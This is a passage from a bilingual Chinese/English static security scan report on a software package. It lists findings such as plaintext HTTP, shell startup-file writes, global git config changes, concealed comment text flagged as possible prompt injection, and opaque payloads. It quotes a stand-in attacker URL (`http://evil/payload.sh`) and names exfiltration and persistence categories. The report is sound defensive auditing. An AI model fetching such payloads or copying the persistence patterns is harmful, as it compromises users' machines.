  中 修复：优先使用纯实现；若必须使用预编译产物，则内置该产物并记录其摘要，而不是在安装时下载。
  EN Fix: Prefer a pure implementation, or vendor the prebuilt artifact with a recorded digest instead of downloading it at install time.
- **中 / MEDIUM** `net.plaintext-http` — 使用明文 HTTP 端点 / Uses a plaintext HTTP endpoint
  中 指向公网主机的 `http://` URL 以明文收发数据，传输途中可以被读取或篡改；这样到达的内容也可以被换成另一份载荷。
  EN An `http://` URL to a public host sends and receives data in the clear, where it can be read or rewritten in transit; anything that arrives this way can also be replaced with a different payload.
  - `docs/sitemap.xml:2` — `http://www.sitemaps.org/schemas/sitemap/0.9`
  - `packages/misakanet-setup/scripts/e2e-packaged-install.mjs:316` — `http://127.0.0.1:${server.address(`
  - `tasks/lesson-git-tls-handshake-failure.json:13` — `http://127.0.0.1:7890\ngit`
  - `tasks/lesson-github-actions-code-injection.json:12` — `http://evil/payload.sh`
  - ……另有 8 处 / … and 8 more location(s)
  中 修复：改用 `https://`，并固定你实际要通信的主机。
  EN Fix: Switch to `https://` and pin the host you intend to talk to.
- **中 / MEDIUM** `obf.long-minified-line` — 整行是压缩或机器生成的数据块 / Line is a single minified or machine-generated blob
  中 该行超过 500 个字符且几乎没有空白，正是打包载荷、压缩字符串表或机器生成单行代码的样子。这样的一行用肉眼什么也审不出来。
  EN The line is over 500 characters with almost no whitespace, which is what a bundled payload, a packed string table or a machine-generated one-liner looks like. Nothing on such a line is reviewable by eye.
  - `workers/register-proxy-sw.js:928` — `const QUERY_ALIAS_TABLE = {"version":2,"stopwords_zh":["如何","怎么","怎样","为什么","是什么原因","什么原因","怎么办","请问","求助","报错","错误","失败","无法","不能","不行","问题","原因","方法","方案","教程…`
  中 修复：发布未压缩的源码，或在 README 中说明该文件由哪个构建产出、可读源码在哪里。
  EN Fix: Ship unminified source, or state in the README which build produced the file and where the readable source lives.
- **中 / MEDIUM** `persist.shell-rc-append` — 追加写入 shell 启动文件 / Appends to a shell startup file
  中 该行写入了 `.bashrc`、`.zshrc`、`.profile` 或 fish 配置，因此改动会在之后每个交互式 shell 中生效，而且删掉包目录也不会消失。
  EN The line writes into `.bashrc`, `.zshrc`, `.profile` or a fish config, so the change takes effect in every future interactive shell and survives removing the package directory.
  - `tasks/lesson-wsl-proxy-setup.json:12` — `"solution": "```bash\n# 1. 设置代理环境变量（临时）\nexport http_proxy=http://$(hostname).local:7890\nexport https_proxy=http://$(hostname).local:7890\nexport HTTP_PROXY=$h…`
  中 修复：不要修改 shell 启动文件；如果需要 shell 集成，就把那行内容打印出来，由用户自行决定是否添加。
  EN Fix: Do not modify shell startup files; if a shell integration is required, print the line for the user to add deliberately.
- **中 / MEDIUM** `priv.package-manager-config-write` — 改写包管理器或全局 git 配置 / Rewrites a package manager or global git configuration
  中 该行执行了 `npm config set` 或 `git config --global`，这会改变用户之后每条命令的配置——包括依赖从哪个仓库拉取，以及 git 调用哪个程序作为钩子。
  EN The line runs `npm config set` or `git config --global`, which changes settings for every future command the user runs — including which registry packages come from and which program git calls for hooks.
  - `.github/workflows/fix-dco.yml:83` — `run: git config --global safe.directory '*'`
  - `docs/benchmarks/benchmark-2026-09-02.json:13` — `"git config --global plugin.auto-merge-ci-pipeline.update true",`
  - `docs/benchmarks/benchmark-2026-09-02.json:14` — `"git config --global plugin.auto-merge-ci-pipeline.status",`
  - `docs/benchmarks/benchmark-2026-09-02.json:57` — `"git config --global auto-merge.enabled",`
  - ……另有 2 处 / … and 2 more location(s)
  中 修复：用环境变量或命令行参数为单条命令传配置，而不是写入用户的持久化配置。
  EN Fix: Pass configuration per command with environment variables or flags instead of writing the user's persistent config.
- **中 / MEDIUM** `prompt.concealed-instruction` — 把文本藏在注释或不可见字符中 / Hides text in a comment or invisible characters
  中 该行把内容藏在 HTML 注释里，或藏在零宽字符与双向控制字符之后，这些内容在 diff 或渲染后的文档中什么都看不见，却仍会作为文本被读取。
  EN The line conceals content either in an HTML comment or behind zero-width and bidirectional control characters, which render as nothing in a diff or a rendered document while still being read as text.
  - `badcase/1118/intake.md:23` — `<details><summary>This repo is using Opire - what does it mean? 👇</summary><br/>💵 Everyone can add rewards for this issue commenting <code>/reward 100</code> …`
  - `badcase/1119/intake.md:23` — `<details><summary>This repo is using Opire - what does it mean? 👇</summary><br/>💵 Everyone can add rewards for this issue commenting <code>/reward 100</code> …`
  - `badcase/1129/intake.md:23` — `<details><summary>This repo is using Opire - what does it mean? 👇</summary><br/>💵 Everyone can add rewards for this issue commenting <code>/reward 100</code> …`
  - `badcase/1130/intake.md:23` — `<details><summary>This repo is using Opire - what does it mean? 👇</summary><br/>💵 Everyone can add rewards for this issue commenting <code>/reward 100</code> …`
  - ……另有 25 处 / … and 25 more location(s)
  中 修复：删除被隐藏的文本和不可见字符；审查者看不到的东西就不该出现在发布的包里。
  EN Fix: Delete the concealed text and the invisible characters; anything a reviewer cannot see does not belong in a shipped package.
- **中 / MEDIUM** `supply.unscannable-payload-with-network` — 随包携带不可读载荷且存在对外请求 / Unreadable payload shipped alongside outbound requests
  中 该包携带了无法按文本读取的大文件——二进制文件、压缩包或压缩过的数据块——同时又建立对外连接，因此它发送的内容中有一部分是本次审计从未检查过的。
  EN 10 shipped file(s) are 64 KiB or larger and were not read as text, the largest being .codex-plugin/assets/logo.png at 472 KiB, while this package also makes outbound requests. Whatever those files contain leaves the machine unexamined.
  - `.codex-plugin/assets/logo.png` — `482938 bytes not decoded as text`
  - `archive/dead/feishu_ws_client.py:2` — `Feishu WebSocket Client - 飞书长连接客户端`
  - `archive/dead/feishu_ws_client.py:3` — `使用 WebSocket 接收飞书消息并处理回调`
  中 修复：删除这个不透明载荷，或说明它究竟是什么；审计无法为自己读不到的字节背书。
  EN Fix: Remove the opaque payload or document what it is; an audit cannot vouch for bytes it could not read.

### 低 / LOW (3)

- **低 / LOW** `cred.credential-path-mention` — 出现凭据路径但并未读取 / Credential path appears without being read
  中 某一行提到了敏感路径，却没有执行读取。报告记录这一条，是为了把仅仅出现在日志或错误信息中的路径，与真正被打开的路径区分开。
  EN A sensitive path is named on a line that performs no read. This is reported so the report can distinguish a path that is merely echoed in a log or error message from one that is actually opened.
  - `.github/actions/classify-failure/action.yml:46` — `exit_code_raw = os.environ.get("EXIT_CODE", "1")`
  - `.github/workflows/auto-draft.yml:60` — `event = json.loads(Path(os.environ["GITHUB_EVENT_PATH"]).read_text(encoding="utf-8"))`
  - `.github/workflows/cite-lesson.yml:34` — `issue = json.loads(os.environ.get('ISSUE_JSON', '{}'))`
  - `.github/workflows/intake-pipeline-test.yml:61` — `"kind": os.environ["INT_KIND"],`
  - ……另有 46 处 / … and 46 more location(s)
  中 修复：确认该路径只出现在文档或提示信息中；如果它随后被传给读取调用，那一行就会触发更严重级别的读取规则。
  EN Fix: Confirm the path is only used in documentation or messaging; if it is later passed to a read call, expect the higher-severity read rules to fire on that line.
- **低 / LOW** `obf.decoded-payload-literal` — 携带解码、转义或高熵字面量 / Carries a decoded, escaped or high-entropy literal
  中 一个很长的字面量会在运行时被解码（base64、`atob`、`unescape`、`decodeURIComponent`），或者写满了密集的十六进制、Unicode 转义，或者呈现出编码数据块那种近乎均匀的字符分布。
  EN A long literal is decoded at runtime (base64, `atob`, `unescape`, `decodeURIComponent`), written with dense hex or unicode escapes, or has the near-uniform character distribution of an encoded blob.
  - `workers/mcp-content-suspicion.test.mjs:119` — `content: Buffer.from('# Proxy timeout\n\nUse a mirror and raise the timeout.\n', 'utf8').toString('base64'),`
  中 修复：把该值保存为可读源码，或保存为格式有文档说明的数据，让审查者能看清实际运行的到底是什么。
  EN Fix: Store the value as readable source or as data with a documented format, so a reviewer can see what is actually being run.
- **低 / LOW** `obf.dynamic-require` — require 或 import 了动态计算的模块路径 / Requires or imports a computed module path
  中 模块路径是计算出来的而非字面量，真正被加载的包由运行时决定，光看 import 语句根本查不出来。
  EN The module path is computed rather than written literally, so the package that actually gets loaded is decided at runtime and cannot be checked by reading the imports.
  - `packages/fatal-guard/tests/verify-fix.js:102` — `try { require(path.join(__dirname, '..', 'index')); done(true); }`
  中 修复：使用静态的 import 说明符，或用一张显式表把已知键映射到静态 import。
  EN Fix: Use a static import specifier, or an explicit table mapping known keys to static imports.

_按类别 / By category:_ 凭据读取 / credential access 5 · 网络回调 / network callbacks 5 · 数据外传 / exfiltration 4 · 提权 / privilege 4 · 提示注入 / prompt injection 4 · 持久化 / persistence 3 · 安装脚本 / install scripts 3 · 混淆 / obfuscation 3 · 破坏性 / destructive 2 · 供应链 / supply chain 1

## 扫描说明 / Scan notes

- stripped the archive's single top-level directory `MisakaNet-HEAD/`
- skipped data/lessons.json: 1228219 bytes exceeds the 524288-byte per-file cap
- skipped docs/benchmarks/benchmark-2026-08-30.json: 1257395 bytes exceeds the 524288-byte per-file cap
- skipped docs/benchmarks/benchmark-2026-08-31.json: 1401360 bytes exceeds the 524288-byte per-file cap
- skipped docs/benchmarks/benchmark-2026-09-06.json: 1604586 bytes exceeds the 524288-byte per-file cap
- skipped docs/benchmarks/benchmark-2026-09-07.json: 1608741 bytes exceeds the 524288-byte per-file cap
- skipped docs/benchmarks/benchmark-2026-09-14.json: 1753478 bytes exceeds the 524288-byte per-file cap
- skipped docs/benchmarks/latest.json: 1753478 bytes exceeds the 524288-byte per-file cap
- skipped docs/data/lessons.json: 1228219 bytes exceeds the 524288-byte per-file cap
- skipped promotional/og-card.png: 2767315 bytes exceeds the 524288-byte per-file cap
- skipped promotional/search lesson.gif: 6167505 bytes exceeds the 524288-byte per-file cap
- skipped uv.lock: 777194 bytes exceeds the 524288-byte per-file cap
- ……另有 4 项 / … and 4 more

---

高评级表示这份规则目录中没有命中，并不等于该包安全。静态分析看不到运行期才拼装出来的行为；部分扫描已在上方标注。 / A high grade means no rule in this catalog fired, not that the package is safe. Static analysis cannot see behavior assembled at runtime, and a partial scan is marked as such above.
